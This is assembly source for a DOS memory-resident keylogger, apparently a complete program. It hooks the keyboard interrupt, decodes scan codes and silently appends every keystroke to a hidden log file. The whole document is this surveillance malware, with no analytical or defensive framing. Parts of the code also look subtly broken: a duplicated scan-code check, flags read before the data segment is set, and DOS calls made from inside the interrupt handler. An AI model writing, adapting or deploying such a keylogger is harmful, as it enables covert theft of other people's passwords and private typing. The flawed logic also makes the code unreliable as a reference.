.286
.model small         

.code
org 100h
begin:
    jmp start
    
old_int dd ?    
file_id dw 0       
file_name db "log.txt",0     

buffer db ?

shiftFlag db 0
capsFlag db 0
ASCIITableLow db '*', '*', "1234567890-=", '*', 09h
              db "qwertyuiop[]", '*', '*' 
              db "asdfghjkl;'`", '*', "\zxcvbnm,./"
              db '*', '*', '*'
ASCIITableUp db '*', '*', "!@#$%^&*()_+", '*', 09h
             db "QWERTYUIOP{}", '*', '*' 
             db 'ASDFGHJKL:"~', '*', "|ZXCVBNM<>?" 
             db '*', '*', '*'           

ascCount equ 39h

getASCII proc
    cmp al,1Ch
    je enterPressed   
    cmp al,39h
    je spacePressed
    
    cmp al,2Ah     
    je shiftPressed
    cmp al,39h     
    je shiftPressed 
    cmp al,3Ah     
    je capsPressed    
    
    sub al,80h
    cmp al,2Ah     
    je shiftReleased
    cmp al,39h     
    je shiftReleased 
    cmp al,3Ah     
    je capsPressed             
    
    add al,80h      
    cmp al,80h
    ja flagsHandled
    
    cmp capsFlag,0
    jne capsNotActive
    cmp shiftFlag,0
    je lowCase
    jmp upCase

enterPressed:
    mov al,0Ah
    jmp getASCII_end
    
spacePressed:
    mov al,20h
    jmp getASCII_end
    
capsNotActive:
    cmp shiftFlag,1
    je lowCase
    jmp upCase    
    
shiftPressed:
    mov shiftFlag,1
    jmp flagsHandled
    
shiftReleased:
    mov shiftFlag,0
    jmp flagsHandled
     
capsPressed:
    cmp capsFlag,0
    jne resetCaps
    mov capsFlag,1
    jmp flagsHandled
    
resetCaps:
    mov capsFlag,0
    jmp flagsHandled    
    
lowCase:    
    lea di,ASCIITableLow
    xor cx,cx                    
    cmp al,ascCount
    ja notChar
    jmp skip
    
upCase:    
    lea di,ASCIITableUp
    xor cx,cx     
    cmp al,ascCount
    ja notChar    
    
skip:
    cmp cl,al
    jae get
    inc di
    add cl,1
    jmp skip 
     
get:
    mov al,cs:[di]
    jmp getASCII_end
        
notChar:
    mov al,'*'
    jmp getASCII_end
    
flagsHandled:
    xor ax,ax

getASCII_end:        
    ret
    
getASCII endp

new_int:
    pushf         
    push ds
    push es
    pusha

read_keyboard_buf:
    in al,60h
    call getASCII
    mov buffer,al
    cmp buffer,0
    je end_of_int   
	
open_file:
    push cs
    pop ds
    
	mov al,1
    mov ah,3Dh
    lea dx,file_name
    int 21h    
	jc create_file 
	
    mov file_id,ax
	jmp save_keystroke
    
create_file:
	mov ah,5Bh     
    mov cx,0         
    lea dx,file_name     
    int 21h
	mov file_id,ax

save_keystroke:
    xor cx,cx
    xor dx,dx
    mov bx,file_id
       
    mov ah,42h
    mov al,02h
    int 21h 
    
    mov ah,40h
    mov cx,1
    lea dx,buffer
    int 21h   
      
close_file:
    mov bx,file_id
    mov ah,3Eh
    int 21h
	
end_of_int:
    popa       
    pop es
    pop ds
	call cs:old_int
	mov al,20h
	out 20h,al
    iret

int_size dw $ - begin
 
start:   
	push cs
    pop ds
    
    mov ax,3509h
    int 21h
    mov word ptr old_int,bx
    mov word ptr old_int+2,es
    
    lea dx,new_int
    mov ax,2509h
    int 21h
	
    mov dx,int_size 
    shr dx,4 
    inc dx
    mov ax,3100h 
    int 21h

end start        